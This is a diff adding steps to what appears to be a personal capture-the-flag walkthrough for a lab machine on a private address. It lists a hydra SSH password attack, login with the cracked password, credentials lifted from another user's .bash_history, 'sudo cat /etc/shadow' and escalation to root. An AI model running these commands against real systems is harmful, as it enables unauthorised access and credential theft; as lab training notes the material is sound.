@@ -42,3 +42,16 @@ results:
 use wordpress;
 show tables;
 select user_login, user_pass from wp_users;
+
+6. Time for HYDRA
+> hydra ssh://192.168.56.102 -L users.txt -p plbkac
+> result: zoe user match!
+
+7. Login as zoe
+> ssh -l zoe 192.168.56.102 (pass: plbkac)
+> enumaration (looking for something in /home/ directory > found in JKanode folder .bash_history with credentials for user "peter"
+ 
+8. Login as peter > su peter (with password)
+> go to peter /home directory and found ".sudo.as.admin.successfull" (ls -a)
+> sudo cat/etc/shadow
+> sudo su > whoami (root)
